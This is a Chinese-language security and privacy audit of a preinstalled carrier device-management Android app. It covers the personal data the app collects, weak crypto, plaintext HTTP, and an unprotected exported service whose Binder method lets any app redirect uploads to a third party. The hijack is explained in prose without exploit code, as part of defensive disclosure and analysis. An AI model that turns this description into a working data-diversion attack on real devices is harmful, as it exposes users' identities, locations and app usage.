# SystemHelper 逆向工程与安全审计总报告

| 项目 | 内容 |
|---|---|
| 报告版本 | 总报告 v1.0（整合 5 份底稿） |
| 审计对象 | `SystemHelper_1.2-20221110.apk` |
| 包名 / 版本 | `com.mobiletools.systemhelper` / `1.2-20221110`（versionCode 3） |
| 文件大小 | 1,762,193 字节 |
| MD5 | `a78da3f746597509ab61054689a65353` |
| SHA-256 | `6658c4be127bdf57ae276a91ae686a9fe26e65f17ee3ba5dec91c61d51fee3b4` |
| 签名证书 | `CN=bbkmobile.com.cn, OU=IQOO, O=BBK, C=CN`（平台级，CA:true，SHA1withRSA/2048） |
| 审计方式 | 纯静态逆向（JADX 逐类反编译 + DEX 结构分析 + 资源表解析 + 证书解析），未对目标服务器发起任何请求 |
| 审计日期 | 2026-11-14 至 2026-11-16 |
| 总体结论 | 隐私：**构成系统性侵害**；安全：**上报通道可被任意应用劫持** |

---

# 第 0 章 阅读指南

## 0.1 本报告的构成

本报告由 5 份底稿整合而成，所有技术证据均可回溯。

| 底稿 | 原行数 | 并入 |
|---|---|---|
| `SystemHelper_安全审计报告.md`（v1） | 790 | 第 6 章、附录 A/E |
| `SystemHelper_审计报告_v2_隐私与自身安全.md` | 886 | 第 5 章框架、第 7 章 |
| `SystemHelper_隐私影响评估报告.md` | 660 | 第 5 章十角度 |
| `核心代码索引.md` | 306 | 附录 A |
| `核实报告_录屏与APK上传.md` | 307 | **第 8 章（完整并入）** |

底稿全部保留在 `audit/` 目录，本报告不是简单拼接 —— 每处事实只保留一次，取各版本中证据最完整、表述最准确的写法。

## 0.2 证据分级

本报告对每条结论标注证据强度，这是判断可信度的前提：

| 标记 | 含义 | 读者应如何对待 |
|---|---|---|
| `[A]` | 由 APK 代码、资源、Manifest **直接证实**，任何人可复现 | 可当作事实引用 |
| `[B]` | 由代码逻辑**强推断**，前提明确 | 可引用，但需说明"据推断" |
| `[C]` | 需服务端或运行时数据才能确认，**本报告无法验证** | 不得当作结论引用 |
| `[D]` | **无证据**，本报告不作断言 | 不构成指控 |

**标记的使用约定**：本报告正文大量直接引用反编译得到的代码片段 —— **凡附有代码片段且片段可复现的结论，即为 `[A]` 级**，不再逐一标注；标记仅用于需要特别提示强度的位置（尤其是 `[C]` 与 `[D]`，因为它们是"本报告不能证明什么"的边界）。

## 0.3 三项自我约束

1. **不利证据与有利证据同时列出** —— 见 5.8「反面证据」、8.6「对厂商有利的修正」；
2. **不推断动机** —— 只判断"是否合规""是否构成侵害"，不判断"是否恶意"；
3. **不夸大范围** —— 结论仅适用于采用本版本 APK 的机型，不推及该厂商其他产品或运营商其他业务。

## 0.4 一个必须前置的说明

> 本报告**未对 `dm.wo.com.cn` 发起任何网络请求**，服务端如何处理数据完全未知。

因此所有涉及服务端行为的判断（是否与实名库关联、是否共享给厂商、是否用于营销、是否出境、是否发生过泄露）一律标注 `[C]`，**不进入结论**。

## 0.5 章节导航

| 想了解 | 直接跳转 |
|---|---|
| 结论与风险统计 | 第 1 章 |
| 这软件是什么、谁做的 | 第 3 章 |
| 采了哪些数据 | 第 4 章 |
| 对用户隐私的影响（法律视角） | 第 5 章 |
| 技术安全缺陷（攻击者视角） | 第 6 章 |
| 两层如何互相放大 | 第 7 章 |
| "会录屏吗""传 APK 吗" | **第 8 章** |
| 违不违法 | 第 9 章 |
| 怎么修 | 第 10 章 |
| 用户现在能做什么 | 第 11 章 |
| 代码在哪 | 附录 A |
| 815 个类分别是什么 | 附录 B |

---

# 第 1 章 执行摘要

## 1.1 一句话结论

这是一个**中国联通定制终端的设备管理组件**，它在用户不知情、无法拒绝、无法关闭的情况下，周期性采集双卡身份信息、基站位置、全部已安装应用及其使用时长与流量，上传至运营商服务器；而**它的上报通道可被设备上任意一个普通应用改写，把数据转向第三方**。

## 1.2 三层结论

**第一层：它做了什么（隐私）**

39 个字段的单条记录，包含双卡 IMEI、IMSI、ICCID、手机号、基站编号与位置区、VoLTE/5G 状态、公网 IP、内存与存储容量，以及**每个已安装应用的包名、显示名、前台使用时长、分卡流量**。24 小时一次基础上报，7 天一次应用画像上报，开机后 4 分钟静默首发。

**第二层：它有多脆弱（安全）**

承载这套上报逻辑的 `RegisterHelperService` 声明了 `exported="true"` 却**没有 `android:permission`**。它暴露的 Binder 方法 `a(String)` 会直接写入上报服务器地址。任何应用绑定一次，就能把后续全部数据改投第三方 —— 不需要权限、不需要 root、不需要用户点击。

**第三层：它合不合法（法律）**

六种法定合法性基础无一成立；告知覆盖率 23% 且文案从未展示；同意四要件全不成立；十项法定权利实现度为零。构成民事侵权，行政违法可能性很高，刑事证据不足。

## 1.3 风险总表（18 项）

### 隐私层面（8 项）

| 编号 | 问题 | 严重度 | 核心证据 |
|---|---|---|---|
| P-01 | 告知—同意机制形同虚设 | **严重** | 文案仅存于 `resources.arsc`，无任何界面引用；`f.g` 默认 true |
| P-02 | 采集范围超出最小必要 | **严重** | 12 类字段中 5 类与业务目的无因果关系（42%） |
| P-03 | 开机静默回传、周期唤醒 | 高 | `priority=2147483647`、延迟 4 分钟、穿透 Doze |
| P-04 | 接收方/用途/期限/共享均未披露 | 高 | 应用内无任何说明；证书主体 `O=UNICOM` |
| P-05 | 用户无关闭/撤回/删除/卸载权 | 高 | 10 项权利实现度 0 |
| P-06 | 敏感数据明文留存 | 高 | `history` 100 条 + `signal` 500 条，均无加密 |
| P-07 | 强制修改系统 VoLTE 设置 | 中 | 反射调用 `setAdvancedCallingSettingEnabled(true)` |
| P-08 | 特殊场景风险加剧 | 中 | 未成年人、政企终端、二手设备 |

### 安全层面（12 项）

| 编号 | 问题 | 严重度 | CVSS 近似 |
|---|---|---|---|
| S-01 | 导出服务无鉴权，上报通道可被劫持 | **严重** | 9.1 |
| S-02 | 全链路明文 HTTP | **严重** | 7.0 |
| S-03 | 密码学误用（密钥=MD5(明文)、ECB） | **严重** | 6.3 |
| S-04 | 平台级 CA 证书 + sharedUserId | **严重** | — |
| S-05 | 明文落盘 + MODE_WORLD_READABLE | 高 | 5.9 |
| S-06 | 明文 PII 写 logcat，开关可远程打开 | 高 | 6.6 |
| S-07 | Activity / Receiver 导出面过宽 | 中 | — |
| S-08 | 私有 AIDL 依赖，绑定前不校验签名 | 中 | — |
| S-09 | 无完整性校验，可任意重打包 | 中 | — |
| S-10 | SHA-1 摘要，密钥 28 年不轮换 | 低 | — |
| S-11 | 代码缺陷（NPE、死分支、空实现） | 低 | — |
| S-12 | 外部输入无校验（IP 回显） | 低 | — |

**合计：严重 4 / 高 5 / 中 5 / 低 4。**

## 1.4 最危险的组合

单看任一项都不足以说明问题，真正的风险来自三者叠加：

```
P-02（采了 39 字段的全套身份与行为数据）
  × S-01（上报地址可被任意应用改写）
  × S-02（链路明文传输）
= 任意一个装机量几十万的无害小工具，
  都能静默接管本机全部用户的实名身份、位置与行为画像。
```

## 1.5 外部传言核查结论

| 指控 | 判定 | 依据（详见第 8 章） |
|---|---|---|
| 会录屏 | **不属实** | 录屏四环节（授权/采集/编码/传输）全部断裂，且无动态加载与 native 库可绕过 |
| 上传所有 APK 包名 | **属实** | `getInstalledApplications(0)` + `pkgName` + 使用时长 + 分卡流量，7 天一次 |
| 上传 APK 文件 | **不属实** | 无 `sourceDir`/`ZipFile`，无 multipart，body 恒为单个 JSON |

## 1.6 投入产出比

18 项发现中，**有 3 项合计不到 8 人日，可消除 80% 的实际风险**：

| 措施 | 工作量 | 消除的风险 |
|---|---|---|
| S-01 关闭导出服务（改一行 Manifest） | **0.5 人日** | 危害最高的一条链路 |
| S-02 全链路 HTTPS + 证书固定 | 2 人日 | 链路窃听 |
| P-02 删除应用画像与基站采集 | 5 人日 | 超范围采集的主体部分 |

**S-01 是唯一一个"改一行配置就能消除严重漏洞"的例子**，应作为第一优先。

---

# 第 2 章 审计对象与方法

## 2.1 基本信息

```
包名      : com.mobiletools.systemhelper
版本      : 1.2-20221110 (versionCode 3)
大小      : 1,762,193 字节
minSdk    : 24  /  targetSdk: 33  /  compileSdk: 33
DEX       : classes.dex (1,171,504 字节，单 dex)
类 / 包   : 815 / 192
原生库    : 0 个 .so
assets    : 仅 pub.cer（1 KB）
加固      : 无（无壳、无 VMP、无 Java2C）
混淆      : 有（R8，类名与成员名重命名）
```

## 2.2 工具链

| 环节 | 手段 |
|---|---|
| 反编译 | JADX（MCP 集成），逐类获取 Java 源码 |
| 交叉引用 | JADX 的 xrefs（方法级调用关系） |
| DEX 字符串 | 二进制正则提取（URL、`ro.*`、私有包名、API 类名） |
| 资源 | `resources.arsc` 字符串池逐条解析 |
| 签名 | `keytool -printcert`、APK Signing Block 魔数校验 |
| 证书 | `openssl x509`（DER 解析、密钥强度） |
| 行为验证 | 本地构造请求 + 模拟服务端（见附录 D） |

## 2.3 覆盖范围：815 个类的分布

逐类反编译后，815 个类可分为两部分：

| 类别 | 类数 | 说明 |
|---|---|---|
| **自有业务代码** | **约 111** | `b.c.a.a`（59，设备信息读取器与厂商适配器）、`b.c.a.b`（15，基础设施）、`com.mobiletools.systemhelper.*`（30，业务与组件）、AIDL（7） |
| 第三方库 | ~704 | `android.support.*`、`android.arch.*`、`androidx.*`，以及**被 R8 重命名到 `a.a.a.*` / `a.b.*` 的 AppCompat 代码** |

> **一个重要认知修正**：初次分析把 `a.b.*`、`a.a.a.*` 误判为"自有混淆代码"。逐类打开后确认它们是 AndroidX/AppCompat 库 —— `a.b.c.a.a` 是 `ContextCompat`、`a.b.c.g.a` 是 `AbsSavedState`、`a.b.b.a.a` 是 `R.attr` 常量数组、`a.b.d.a.a` 是 `R.styleable` 常量表。真正的业务代码只有约 111 个类，全部集中在 `b.c.a.*` 与 `com.mobiletools.*`。完整清单见附录 B。

## 2.4 关于"字符串扫描是否足够"的说明

DEX 格式有一个硬约束，决定了类名扫描对"是否调用某 API"这一问题**具备完备性**：

> 任何方法调用都必须在 `method_ids` 中登记；`method_ids` 引用 `string_ids` 中的类名与方法名。
> **因此只要调用了 `MediaProjectionManager`、`SurfaceControl.screenshot`，或通过反射使用字符串 `"android.view.SurfaceControl"`，该字符串必然出现在 `classes.dex` 中。**

唯一能绕过这一约束的三条路径，均已验证为空：

| 绕过方式 | 检查项 | 结果 |
|---|---|---|
| 动态加载外部 dex | `DexClassLoader` / `PathClassLoader` / `InMemoryDexClassLoader` / `dalvik/system` / 插件框架 | **全部 0** |
| native 库实现 | `.so` 数量、`loadLibrary` | **0 个 .so，0 次调用** |
| 服务端下发指令 | 本地无实现则无法执行 | 不适用 |

补充：`Class.forName` 全包仅 1 处，加载目标为 `SystemProperties` 与各类 `TelephonyManager`（`ColorOSTelephonyManager`、`HwTelephonyManager`、`MzTelephonyManager`、`MSimTelephonyManager`、`TelephonyManagerEx`、`DmUnicomAbsTelephonyManager`），**无一个是显示或图像相关类**。

## 2.5 局限性（4 条）

1. **未进行动态调试**。无真机/模拟器环境，未抓包验证实际外发内容。所有结论基于静态反编译。
2. **未对服务端发起请求**。`dm.wo.com.cn` 的处理逻辑完全未知，相关判断标注 `[C]`。
3. **反编译存在固有失真**。JADX 对控制流平坦化的方法会失败 —— 本样本有 5 处（`RegisterIntentService.onHandleIntent`、`SIMStateReceiver.onReceive`、`b.c.a.a.b1#a`、`b.c.a.a.h0#a` 及若干大方法），已按 smali 语义补全并在文中标注。
4. **无法排除同设备的其他预装组件**。运营商定制机常见 10–30 个预装件，本报告只针对这一个 APK。

---

# 第 3 章 应用画像

## 3.1 定性：这是什么软件

**中国联通定制终端的设备管理（DM，Device Management）组件。**

判定依据（五条独立证据）：

| # | 证据 | 强度 |
|---|---|---|
| 1 | 回传域名 `dm.wo.com.cn:18080`（"wo" 为联通"沃"品牌域），接口 `/registerv3` | `[A]` |
| 2 | 硬编码联通号段 `46001 / 46006 / 46009` 作为"是否联通网络"的判定 | `[A]` |
| 3 | **`assets/pub.cer` 证书主体为 `C=CN, ST=BJ, L=BJ, O=UNICOM, OU=UNICOM, CN=UNICOM`** —— 加密公钥以中国联通名义签发 | `[A]` |
| 4 | 内置 200+ 机型、50+ 厂商的适配映射表 | `[A]` |
| 5 | 平台级签名（`O=BBK, OU=IQOO`）+ `sharedUserId` + 预装形态 | `[A]` |

第 3 条是本报告中最硬的一条书证 —— 它不是"从域名推测"，而是加密所用公钥的直接声明。

## 3.2 技术架构

```
com.mobiletools.systemhelper（业务层，类名未混淆）
├── Activity/TestActivity            对外入口（导出），展示设备信息 + 申请权限
├── control/
│   ├── DMApplication                应用入口
│   ├── OnBootReceiver               开机广播（导出，优先级 2147483647）
│   ├── ScheduleRegisterReceiver     24h 周期任务
│   ├── AppInfoRegisterReceiver      7d 应用画像任务
│   ├── SIMStateReceiver             换卡监听（导出）
│   ├── ConnectStateReceiver         网络监听（导出）
│   ├── a / b                        PhoneStateListener / TelephonyCallback（含 GPS 采集）
│   ├── c                            数据模型（40 字段，39 个上报）
│   ├── d                            IPv4/IPv6 采集线程
│   ├── e                            应用画像采集线程
│   ├── f                            SignalInfo 采集线程（run 为空，实际失效）
│   └── g                            上报线程（加密 + HTTP POST）
└── service/
    ├── RegisterHelperService        **导出 AIDL 服务（无权限）** ← 核心风险点
    ├── RegisterIntentService        厂商 AIDL 绑定（格力 / 努比亚）
    └── RegisterJobService           JobScheduler（受 BIND_JOB_SERVICE 保护）

b.c.a.a.*（设备信息读取器，59 类）
├── c                                基类（getImei / getSubscriberId / 基站 / VoLTE）
├── f1                               工厂 + 机型路由（200+ 分支）
└── a ~ z0                           50 余个厂商适配子类

b.c.a.b.*（基础设施，15 类）
├── a   Alarm 调度      b   AppInfo 模型    c   加密（MD5/AES）
├── d   SQLite(history) e   HTTP GET        f   全局常量
├── g   HTTP POST       h   字段脱敏        i   内存/存储采集
├── j   日志            k   RSA             l   SharedPreferences
├── m   SQLite(signal)  n   信号模型        o   反射工具

b.a.b.a.a / b.b.a（厂商私有 AIDL：格力 / 努比亚）
```

## 3.3 组件与权限清单

### 导出的组件（5 个，全部无权限保护）

| 组件 | 类型 | 风险 |
|---|---|---|
| `service.RegisterHelperService` | Service | **严重** —— 可改写上报地址 |
| `Activity.TestActivity` | Activity | 中 —— 权限钓鱼、信息展示 |
| `control.OnBootReceiver` | Receiver | 中 —— 触发采集 |
| `control.SIMStateReceiver` | Receiver | 中 |
| `control.ConnectStateReceiver` | Receiver | 低 |

已声明的 `com.mobiletools.systemhelper.permission`（`protectionLevel="signature"`）**未被任何组件引用**，属完全失效的防护。

### 申请的权限（10 项）

| 权限 | 实际用途 | 必要性 |
|---|---|---|
| `INTERNET` | 上传 | ✅ |
| `ACCESS_NETWORK_STATE` | 网络判定 | ✅ |
| `READ_PHONE_STATE` | IMEI/IMSI/网络类型 | ⚠️ 部分必要 |
| `READ_PRIVILEGED_PHONE_STATE` | 特权读全部订阅者信息 | ❌ 超出 |
| `ACCESS_FINE/COARSE_LOCATION` | **fused 定位（1s/10m），经纬度写 SignalInfo** | ⚠️ 有真实调用（受默认关闭的 `f.e` 控制） |
| `ACCESS_BACKGROUND_LOCATION` | 配套后台定位 | ⚠️ 配套 |
| `PACKAGE_USAGE_STATS` | 应用使用时长 | ❌ 超出 |
| `QUERY_ALL_PACKAGES` | 枚举全部应用 | ❌ 超出 |
| `READ_EXTERNAL_STORAGE` | 未见对应读取 | ❌ 疑似冗余 |
| `SCHEDULE_EXACT_ALARM` | 穿透 Doze | ❌ 用途不当 |

**统计**：必要 2、部分必要 3、超出 5。

## 3.4 签名与信任根

```
主体      : EMAILADDRESS=bbktel@bbktel.com, CN=bbkmobile.com.cn,
           OU=IQOO, O=BBK, L=Dongguan View, ST=Guangdong, C=CN
序列号    : b153730d8a352539
有效期    : 2012-09-25 → 2040-02-11（28 年）
算法      : SHA1withRSA / 2048 bit
扩展      : BasicConstraints CA:true (PathLen 无限制)
SHA-256   : BC:C3:5D:...:4F:0C:02
```

三个问题：

1. **签名密钥是 CA 密钥**（`CA:true`）—— 应用签名与 CA 私钥复用是密钥管理禁忌，影响面远超单个应用；
2. **平台密钥广泛流通** —— 该主体信息与公开流传的 vivo/BBK 平台签名密钥特征一致，此类密钥在第三方 ROM、刷机包中反复打包；
3. **有效期 28 年** —— 远超合理轮换周期。

> 补充：APK 存在 v2/v3 签名块（`APK Sig Block 42` 命中），因此**不具备**典型 Janus（CVE-2017-13156）可利用条件。

## 3.5 上报公钥

```
文件      : assets/pub.cer（DER 编码的 X.509 证书）
主体      : C=CN, ST=BJ, L=BJ, O=UNICOM, OU=UNICOM, CN=UNICOM
签名算法  : sha256WithRSAEncryption
有效期    : 2019-05-24 → 2119-04-30（**100 年**）
公钥      : **1024 bit RSA**
```

**1024 位 RSA 已被认为不安全**（NIST SP 800-57 自 2013 年起不推荐用于新系统，PCI DSS 明确禁止），且 **100 年不轮换**意味着私钥一旦泄露，影响期是整个世纪。

这也解释了一个细节：签名密文是 128 字节而非 256 字节（2048 位）。

## 3.6 供应链信息泄露

`b.c.a.a.f1#c()` 维护一张 `Build.MODEL → 厂商代号` 的静态映射表，覆盖 200+ 机型：

```java
f583a.put("V1911A", "vivo");   f583a.put("M2001J2C", "Xiaomi");
f583a.put("PCKM00", "OPPO");   f583a.put("EVR-AN00", "HUAWEI");
f583a.put("SM-G9750", "samsung"); f583a.put("NX659J", "nubia");
...
```

这实质上是一份**运营商定制机型清单**（含 5G 机型、平板、行业终端），属供应链敏感信息，随 APK 公开分发。同时它也是 OPPO（`PCKM00` 系列）、小米（`M2001J2C` 系列）等厂商内测机型的对照表。

---

# 第 4 章 数据采集全景

## 4.1 39 个上报字段

数据模型 `com.mobiletools.systemhelper.control.c` 共 40 个成员变量，**39 个进入上报 JSON**（另 1 个为内部缓存）：

| 类别 | 字段 | 可识别/可推断内容 |
|---|---|---|
| **设备属性（7）** | `Manuf`, `Model`, `HWVersion`, `SWVersion`, `OS`, `OSVersion`, `DeviceType` | 型号、批次、ROM 版本、是否定制机 |
| **卡 1（10）** | `IMEI1`, `ICCID1`, `IMSI1`, `MSISDN1`, `MNC1`, `NCLS1`, `CellID1`, `LAC1`, `VolteEnabled1`, `5GEnabled1` | 设备唯一标识 + SIM 标识 + 手机号 + 位置 + 通信配置 |
| **卡 2（10）** | `IMEI2`, `ICCID2`, `IMSI2`, `MSISDN2`, `MNC2`, `NCLS2`, `CellID2`, `LAC2`, `VolteEnabled2`, `5GEnabled2` | 同上，双卡可关联两个身份 |
| **网络（6）** | `AccType`, `IPv4`, `IPv6`, `DataSlot`, `SignalInfo`, `SubType` | 接入方式、公网 IP、主数据卡；**`SubType` 实为 `{RAM, ROM, FREE}`**；**`SignalInfo` 含 RSRP/SINR/RSRQ + cellid + LAC + 时间 + 经纬度** |
| **应用画像（1 个数组）** | `AppInfo[]`：`appLabel`, `pkgName`, `runTime`, `tx1`, `rx1`, `tx2`, `rx2`, `totalData1`, `totalData2`, `totalDataWiFi` | 装了什么、用了多久、走多少流量 |
| **元数据（5）** | `RegType`, `SpecVersion`, `RegVersion`, `Time`, `History[]` | 触发类型、版本、时间、历史记录 |

## 4.2 这不是"设备信息"，是"人的信息"

39 个字段中，描述设备本身的只有 7 个，占 **18%**。

其余 32 个（**82%**）描述的是：

- **持有该设备的人** —— 手机号、SIM 卡（IMSI/ICCID）
- **该人所在的位置** —— 基站编号与位置区、公网 IP、可选的 GPS 经纬度
- **该人的行为** —— 装了哪些 App、每个用了多久、每个走哪张卡耗多少流量

把这份数据集称为"设备信息"，是本报告中最重要的定性偏差。

## 4.3 敏感性判定

依《个人信息保护法》第 28 条（敏感个人信息：一旦泄露或被非法使用，容易导致人格尊严受侵害或人身、财产安全受危害）：

| 字段 | 是否敏感 | 理由 |
|---|---|---|
| `IMEI1/2` | **是（特定身份）** | 设备唯一标识，可绑定实名 |
| `IMSI1/2`、`ICCID1/2` | **是（特定身份）** | SIM 卡唯一标识，直接关联开户人 |
| `MSISDN1/2` | **是（特定身份）** | 手机号即实名登记载体 |
| `CellID1/2` + `LAC1/2` | **是（行踪轨迹）** | 小区级定位，配合 History 可还原路径 |
| `SignalInfo` 中的 `location` | **是（行踪轨迹）** | GPS 经纬度明文 |
| `AppInfo[]` | **是（可推断宗教/医疗/金融）** | 聚合后可推断第 28 条列举的多类信息 |

**结论：13 个字段属法定敏感个人信息**（双卡 `IMEI`/`IMSI`/`ICCID`/`MSISDN`/`CellID`/`LAC` 共 12 个 + `SignalInfo.location` 1 个），**外加一类（应用画像）可推断敏感信息**。

## 4.4 采集的时间与频次

| 触发 | 间隔 | 内容 | 代码 |
|---|---|---|---|
| 开机 | 延迟 **4 分钟** | 基础信息 | `OnBootReceiver` + `b(ctx, 240000L)` |
| 定时 | **24 小时** | 基础信息 | `f.y = 86400000` |
| 定时 | **7 天** | 基础信息 + **全量应用清单** | `f.z = 604800000` |
| 换卡 | 延迟 **6 分钟** | 基础信息（仅 ICCID 真变化时） | `SIMStateReceiver` |
| 信号变化 | **每次变化** | RSRP/SINR + 位置（`f.e` 控制） | `control.b#onSignalStrengthsChanged` |

**关键细节**：应用清单不是每 24 小时传，是**每 7 天才传一次**。`RegType=S` 走 `f1.a(ctx,"S")` → 直接 `new g(...)` 上报，`cVar.K`（AppInfo）为 null，JSON 里是 `"AppInfo":""` 空串；只有 `RegType=A` 才走 `control.e` 线程采集后上报。

每次触发都会重新预约下一次，是自我维持的循环：

```java
// ScheduleRegisterReceiver.onReceive
b.c.a.b.a.d(f614a, l.b(context));   // 先预约 24h 后的自己
...采集上报...
```

## 4.5 完整数据流

```
[BOOT_COMPLETED]  priority = 2147483647
      │
      ▼
OnBootReceiver.onReceive()
      │  b(ctx, 240000)                    ← 延迟 4 分钟
      ▼
AlarmManager.setExactAndAllowWhileIdle()   ← 穿透 Doze 待机
      │
      ▼
f1.a(ctx, "F"/"B"/"S"/"A"/"T")
      │
      ├─ f1.c(ctx, cVar)    基础信息（厂商/型号/ROM/网络/IP）
      ├─ control.e 线程      getInstalledApplications + UsageStats + NetworkStats
      ├─ b.c.a.a.c 适配器    双卡 IMEI/ICCID/IMSI/MSISDN/MNC/CellID/LAC/VoLTE
      ├─ b.c.a.b.i          RAM / ROM / FREE → SubType
      └─ control.b          SignalInfo（RSRP/SINR + GPS 经纬度）
      │
      ▼
c.a()  →  JSONObject（39 字段明文）
      │
      ├─ MD5(json) ──────────────► AES-128 密钥（!!）
      │        └─ RSA(pub.cer, MD5) ─► URL 参数 sign
      ▼
AES/ECB/PKCS5Padding(json, key = MD5)
      │
      ▼
POST http://dm.wo.com.cn:18080/registerv3?ver=3.0&model=..&manuf=..&sign=..
     Content-Type: application/encrypted-json
      │
      ├─ 200 / 416 → 成功，清空本地队列
      └─ 失败      → 写入 SQLite（history 100 条 / signal 500 条，均明文）
```

## 4.6 本地留存

| 位置 | 内容 | 容量 | 加密 |
|---|---|---|---|
| `databases/systemhelper`（表 `history`） | 完整设备信息 JSON | 100 条 | **无** |
| `databases/signalhelper`（表 `signal`） | RSRP/SINR + cellid + LAC + 时间 + **经纬度** | **500 条** | **无** |
| `shared_prefs/com_mobiletools_systemhelper_preference.xml` | 上报地址、日志开关、ICCID、采集周期 | — | `MODE_WORLD_READABLE` |
| logcat | 完整明文 JSON（开关打开时） | 环形缓冲 | **无** |

配置正确项：`allowBackup="false"` —— 阻断了 `adb backup` 导出路径。

---

# 第 5 章 隐私层面：对用户的影响

## 5.1 本层面的核心判断

这个层面的问题**不需要任何攻击者**。用户把手机开机、插上 SIM 卡，采集与上传就已经开始，且贯穿设备生命周期。用户既不知道发生了什么，也没有任何手段让它停下来。

> 这不是"某几项功能做得不够规范"，而是**采集模型本身与个人信息保护的基本框架不兼容**：它默认用户不会察觉、不会拒绝、也无法退出。

---

## 5.2 P-01｜告知—同意机制形同虚设【严重】

### 5.2.1 事实：确实存在告知文案

对 `resources.arsc` 字符串池逐条提取，发现 5 段中文文本（DEX 代码中**无任何中文隐私字面量**）：

```
运营商可能通过
或移动数据网络收集您的设备信息等数据
开启即视为同意联网
访问应用列表和定位
运营商服务
```

拼接语义：

> **「运营商可能通过 [WiFi] 或移动数据网络收集您的设备信息等数据，开启即视为同意联网、访问应用列表和定位。」**

### 5.2.2 缺陷一：告知内容严重残缺

| 应告知项 | 文案是否涵盖 | 实际采集 | 差距 |
|---|---|---|---|
| 设备信息 | ✅ 概括提及 | 型号、ROM、硬件版本 | 可接受 |
| 应用列表 | ✅ 明确提及 | **还包括使用时长与分卡流量** | 未说明 |
| 定位 | ✅ 概括提及 | **基站 CellID/LAC + 可选 GPS 经纬度** | 未说明精度 |
| IMEI | ❌ | 双卡各自采集 | **未告知** |
| IMSI | ❌ | 双卡 | **未告知** |
| ICCID | ❌ | 双卡 | **未告知** |
| 手机号 | ❌ | 双卡 | **未告知** |
| 内存/存储容量 | ❌ | RAM/ROM/FREE | **未告知** |
| 接收方身份 | ❌ | `dm.wo.com.cn`（证书 `O=UNICOM`） | **未告知** |
| 采集频率 | ❌ | 24h / 7d / 开机 / 换卡 | **未告知** |
| 保存期限 | ❌ | 本地 100 + 500 条，服务端未知 | **未告知** |
| 共享/转让 | ❌ | 未知 `[C]` | **未告知** |
| 用户权利与行使方式 | ❌ | 无渠道 | **未告知** |

**覆盖率：13 项应告知内容中涵盖 3 项 = 23%；关键项（接收方/期限/权利）覆盖率为 0%。**

### 5.2.3 缺陷二：这段文案没有任何展示路径

这是本报告中最确凿、也最难辩解的一点：

- APK 内**唯一的自定义界面**是 `res/layout/activity_test.xml`，其完整内容是一个 `TextView`，文本硬编码为 `"Device Info"`；
- 遍历 `res/` 下全部二进制 XML，**无任何一处引用 `@string/`**；
- DEX 中不含中文隐私字面量；
- 应用无引导页、无弹窗、无设置页、无"关于"页。

```xml
<!-- res/layout/activity_test.xml 全文（缩略） -->
<ScrollView ...>
    <TextView android:id="@+id/tv_device_info"
              android:text="Device Info"/>     <!-- 唯一文本，且是占位符 -->
</ScrollView>
```

**该文案是一个孤立资源，本版本中不存在任何能将其呈现给用户的代码路径。**

依《个人信息保护法》第 17 条（七项告知义务），本应用在形式与实质两个层面均不达标。而"把文本编译进 APK 却不展示"，在监管检查中反而是加重情节 —— 说明知道要告知，但选择不展示。

### 5.2.4 缺陷三：同意形式不合法

文案表述为「**开启即视为同意**」——典型的**默认同意 / 默示同意（opt-out）**。

而 IMEI、IMSI、ICCID、手机号属第 28 条项下的**敏感个人信息**，依第 29 条须取得**单独同意**，并提供"不同意仍可使用基本功能"的路径。

代码中的全局开关：

```java
// b.c.a.b.f
public static boolean g = true;                    // 默认开启

// control.g#run()
if (b.c.a.b.f.g) {
    a(b(this.c));                                  // 执行采集上报
    return;
}
b.c.a.b.d dVarA = b.c.a.b.d.a(...);
dVarA.a(this.c.a());                               // 开关关闭时仍写入本地队列
dVarA.close();
j.a("RegisterThread", "User Permission Closed!");  // 仅打日志，不丢弃数据
```

注意最后几行：**即使开关为 false，数据仍被写入本地 SQLite 队列**，只是不立即上传。

### 5.2.5 缺陷四（修正后的准确表述）：同意门控存在机型差异

这是唯一一处对厂商有利的发现，也是初版报告判断过于绝对的地方。

**vivo 适配器（`b.c.a.a.z0`）—— 真实的同意门控**：

```java
private boolean e(Context context) {
    boolean provisioned = Settings.Global.getInt(
            context.getContentResolver(), "device_provisioned", 0) == 1;
    b.c.a.b.j.a("DeviceInfoReaderVIVO", "isBootWizardCompleted: " + provisioned);
    if (provisioned) {
        return Settings.Secure.getInt(
                context.getContentResolver(), "operator_service_improve_plan", 0) == 1;
    }
    return false;
}

@Override
public void a(Context context, c cVar) {
    boolean granted = e(context);
    b.c.a.b.f.g = granted;
    if (!granted) {
        b.c.a.b.j.b("DeviceInfoReaderVIVO", "isUserPermissionOpen==false, do not read!");
        return;                                   // ← 不同意则完全跳过采集
    }
    ...
}
```

**百度/展讯适配器（`b.c.a.a.b`）**：

```java
private boolean d(Context context) {
    return Settings.Secure.getInt(
            context.getContentResolver(), "dm_user_agreement", 0) == 1;
}
```

**门控覆盖面统计**（全包检索，逐类确认）：

| 门控类型 | 引用类数 | 性质 | 是否有效 |
|---|---|---|---|
| `Settings.Secure.operator_service_improve_plan` | 6（含 vivo `z0`） | 运营商服务改进计划 | ✅ 关闭后真跳过 |
| `Settings.Secure.dm_user_agreement` | 2（含百度 `b`） | 用户协议 | ✅ 同上 |
| `Settings.Global.device_provisioned` | 19 | 仅检查开机向导是否走完 | ❌ **不等于同意** |
| 无任何门控 | 其余约 30 个 | 直接采信 `f.g` 默认值 | ❌ 完全无门控 |

**准确结论**：不是"全机型都无同意机制"，而是 **8 个适配器对应真实同意、19 个仅有弱检查、其余无门控**。合规评估应按机型分别判定，但对未覆盖的多数机型，"默认开启 + 无拒绝入口"的结论依然成立。

### 5.2.6 一揽子同意问题

第 29 条要求敏感个人信息**单独同意**。本应用把 IMEI、IMSI、ICCID、手机号、基站位置、应用清单与普通设备型号**打包在同一个开关下**，属典型"一揽子同意"——即使存在同意，也因缺乏粒度而无效。

---

## 5.3 P-02｜采集范围超出最小必要【严重】

### 5.3.1 逐字段必要性论证

以"终端注册、网络能力识别、VoLTE/5G 适配"为业务目的：

| 字段 | 与目的的直接相关性 | 最小化替代方案 | 判定 |
|---|---|---|---|
| `Model` / `Manuf` | 直接相关（决定适配分支） | 无 | ✅ 必要 |
| `OSVersion` | 直接相关 | 无 | ✅ 必要 |
| `VolteEnabled` / `5GEnabled` | 直接相关 | 无 | ✅ 必要 |
| `MNC` / `NCLS` | 直接相关 | 无 | ✅ 必要 |
| `IMEI` | 间接（仅作设备标识） | **随机 UUID 或哈希** | ⚠️ 可最小化 |
| `IPv4` / `IPv6` | 边界（连通性诊断） | 即用即弃、不落库 | ⚠️ 可最小化 |
| `SignalInfo`（RSRP/SINR） | 边界（网络质量） | 运营商侧已有网管数据 | ⚠️ 可最小化 |
